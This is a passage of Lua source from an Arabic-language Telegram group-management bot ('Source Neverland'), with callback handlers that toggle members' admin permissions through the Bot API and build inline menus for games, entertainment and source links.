promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..'&can_manage_chat=false'..infoo..deletee..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin11(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/addadmintrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/addadmintrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage..infoo..deletee..invitee..restrictt..pinn..'&can_promote_members=true' 
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin11(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/chenginfotrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/chenginfotrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage..'&can_change_info=True' ..deletee..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin11(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/delmsggtrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/delmsggtrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..'&can_delete_messages=True' ..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin11(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/banusertrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/banusertrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..deletee..invitee..'&can_restrict_members=True' ..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin11(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/pinmsgtrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/pinmsgtrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..deletee..invitee..restrictt..'&can_pin_messages=True' ..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin11(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/addlinktrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/addlinktrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..deletee..'&can_invite_users=True' ..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin11(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end


if Text and Text:match('amr@(%d+)/user@(%d+)/addadminfalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/addadminfalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
if manage then
local ListGruoup = voice..manage.. infoo..deletee..invitee..restrictt..pinn..'&can_promote_members=false'
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
end
sendin11(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/chenginfofalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/chenginfofalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. '&can_change_info=false' ..deletee..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin11(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/delmsggfalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/delmsggfalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..'&can_delete_messages=false'..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin11(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/banuserfalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/banuserfalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..deletee..invitee..'&can_restrict_members=false' ..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin11(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/pinmsgfalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/pinmsgfalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..deletee..invitee..restrictt..'&can_pin_messages=false' ..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin11(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/addlinkfalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/addlinkfalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..deletee..'&can_invite_users=false'  ..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin11(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
---------------------------------------------------------------------------------------------------------
if Text and Text:match('(.*)/noS') then
sudoo = Text:gsub("/noS","")
print(msg.sender_user_id_,sudoo)
print(msg.sender_user_id_== tonumber(sudoo))
if msg.sender_user_id_ == tonumber(sudoo) then 
--DeleteMessage(msg.chat_id_,{[0] = msg.message_id_})
local Teext = "🚧 ┇ تم الغاء الامر بنجاح ."
database:del(bot_id..":usernewsudo:"..msg.sender_user_id_)
https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..msg.chat_id_..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true') 
return false
end
end

if Text and Text:match('(.*)/yesS') then
sudoo = Text:gsub("/yesS","")
if msg.sender_user_id_ == tonumber(sudoo) then 
local Texxt = "🚧 ┇ حسننا الان يمكنك ارسال معرف المطور الاساسي الجديد ..."
keyboard = {} 
keyboard.inline_keyboard = {{{text = 'إالـغـاء الأمـر', callback_data=msg.sender_user_id_.."/noS"}}}
https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..msg.chat_id_..'&text='..URL.escape(Texxt).."&message_id="..msg_idd.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
database:set(bot_id..":usernewsudo:"..msg.sender_user_id_,data.message_id_)
return false
end
end
---------------------------------------------------------------------------------------------------------
if Text and Text:match('(.*)/gamehome') then
if tonumber(Text:match('(.*)/gamehome')) == tonumber(data.sender_user_id_) then
local Teext =[[*
✦┇#;ُِ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 𝚝𝚑𝚎 𝚐𝚊𝚖𝚎 𝚕𝚒𝚜𝚝 .
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇.َ ‹ 𝘠𝘰𝘶 𝘤𝘢𝘯 𝘤𝘩𝘰𝘰𝘴𝘦 𝘢 𝘨𝘳𝘰𝘶𝘱 𝘰𝘧 𝘨𝘢𝘮𝘦𝘴 .
✦┇.َ ‹ 𝘕𝘰𝘵𝘦: 𝘛𝘩𝘦 𝘴𝘰𝘶𝘳𝘤𝘦 𝘨𝘢𝘮𝘦𝘴 𝘰𝘯𝘭𝘺 𝘨𝘪𝘷𝘦 𝘱𝘰𝘪𝘯𝘵𝘴 .
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '✦ العاب السورس ✦', callback_data=data.sender_user_id_.."/gamesos"},
},
{
{text = '✦ الالعاب الاحترافية ✦', callback_data=data.sender_user_id_.."/gamemm"},
},
{
{text = 'رجوع', callback_data=data.sender_user_id_.."/helps"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/gamesos') then
if tonumber(Text:match('(.*)/gamesos')) == tonumber(data.sender_user_id_) then
local Teext =[[*
✦┇قائمه الالعاب الموجوده
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇لعبة البات ✦┇بات
✦┇لعبة التخمين ✦┇خمن
✦┇لعبه الاسرع ✦┇الاسرع
✦┇لعبة السمايلات ✦┇سمايلات
✦┇لعبة المختلف ✦┇المختلف
✦┇لعبة الامثله ✦┇امثله
✦┇لعبة العكس ✦┇العكس 
✦┇لعبة الحزوره ✦┇حزوره
✦┇لعبة المعاني ✦┇معاني
✦┇لعبة الحروف ✦┇حروف
✦┇لعبة كت تويت ✦┇كت
✦┇لعبة الصراحه ✦┇صراحه
✦┇لعبة لو خيروك ✦┇لو خيروك
✦┇لعبة الرياضيات ✦┇رياضيات
✦┇لعبة الانكليزي ✦┇انكليزي
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇مجوهراتي ✦┇لعرض عدد الارباح
✦┇بيع مجوهراتي + العدد ✦┇لستبدال كل مجوهره ب50 رساله*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '✦ العاب متطورة ✦', callback_data=data.sender_user_id_.."/gamemm"},
},
{
{text = 'رجوع', callback_data=data.sender_user_id_.."/gamehome"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/gamemm') then
if tonumber(Text:match('(.*)/gamemm')) == tonumber(data.sender_user_id_) then
local Teext =[[*
✦┇اهلا بك في قائمة الالعاب المحترفة .
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇يمكنك الان اختيار لعبة .
✦┇قم بارسال اللعبه في المجموعة .
✦┇ملاحظة العاب السورس تعطي نقاط فقط .
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '♟ Chess Game ♟',url="https://t.me/T4TTTTBOT?game=chess"},
},
{
{text = 'لعبة 2048 🎰',url="https://t.me/awesomebot?game=g2048"},
},
{
{text = 'تحداني في ❌⭕️',url="https://t.me/XO_AABOT?start3836619"},
},
{
{text = '🐍 3D Snake Game 🐍',url="https://t.me/T4TTTTBOT?game=snake"},
},
{
{text = '🔵 Color Game 🔴', url="https://t.me/T4TTTTBOT?game=color"},
},
{
{text = '🦖 Dragon Game 🦖', url="https://t.me/T4TTTTBOT?game=dragon"},
},
{
{text = '🏹 Arrow Game 🏹', url="https://t.me/T4TTTTBOT?game=arrow"},
},
{
{text = 'Neverland Team', url="https://t.me/TEAM_Neverland"},
},
{
{text = 'رجوع', callback_data=data.sender_user_id_.."/gamehome"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/helps') then
if tonumber(Text:match('(.*)/helps')) == tonumber(data.sender_user_id_) then
local Teext =[[*
✦┇أهلا بك عزيزي . 
✦┇في اعدادات المجموعه . 
✦┇يمكنك استخدام الازرار عبر ضغط عليهم .
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الاوامر', callback_data=data.sender_user_id_.."/help"},
},
{
{text = 'آوآمر التعطيل', callback_data=data.sender_user_id_.."/homeaddwd"},{text = 'آوآمر القفل', callback_data=data.sender_user_id_.."/homelocks"},
},
{
{text = 'الالعاب', callback_data=data.sender_user_id_.."/gamehome"},{text = 'التسليه', callback_data=data.sender_user_id_.."/tslea0"},
},
{
{text = 'اوامر الرتب', callback_data=data.sender_user_id_.."/rtp0"},
},
{
{text = 'السورس', callback_data=data.sender_user_id_.."/sors0"},
},
{
{text = '↜ اخفاء الامر', callback_data=msg.sender_user_id_.."/delamr"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/sors0') then
if tonumber(Text:match('(.*)/sors0')) == tonumber(data.sender_user_id_) then
local Teext =[[*
✦┇Source Neverland 
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉*

]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Channel Source ،', url="https://t.me/TEAM_Neverland"},
},
{
{text = 'Annotations Source', url="https://t.me/infoo_Neverland"},
},
{
{text = 'Communication Source', url="https://t.me/B333BBBOT"},
},
{
{text = 'Developer Source !', url="https://t.me/B333BB"},
},
{
{text = 'رجوع', callback_data=data.sender_user_id_.."/helps"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
elseif Text and Text:match('(.*)/tslea0') then
if tonumber(Text:match('(.*)/tslea0')) == tonumber(data.sender_user_id_) then
local Teext =[[*
✦┇أهلا بك عزيزي . 
✦┇في اوامر التسليه للمجموعه . 
✦┇يمكنك استخدام الازرار عبر ضغط عليهم .
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'اغنية', callback_data=data.sender_user_id_.."/aknia"},{text = 'ريمكس', callback_data=data.sender_user_id_.."/remex"},
},
{
{text = 'غنيلي', callback_data=data.sender_user_id_.."/knelee"},{text = 'انمي', callback_data=data.sender_user_id_.."/anematin"},
},
{
{text = 'صوره', callback_data=data.sender_user_id_.."/sphoto"},{text = 'ميمز', callback_data=data.sender_user_id_.."/memz"},
},
{
{text = 'متحركه', callback_data=data.sender_user_id_.."/sgifs"},{text = 'شعر', callback_data=data.sender_user_id_.."/shhar"},
},
{
{text = 'فلم', callback_data=data.sender_user_id_.."/sflm"},{text = 'مسلسل', callback_data=data.sender_user_id_.."/smslsl"},
},
{
{text = 'رجوع', callback_data=data.sender_user_id_.."/helps"},
},
{
{text = '↜ اخفاء الامر', callback_data=msg.sender_user_id_.."/delamr"},
},
}
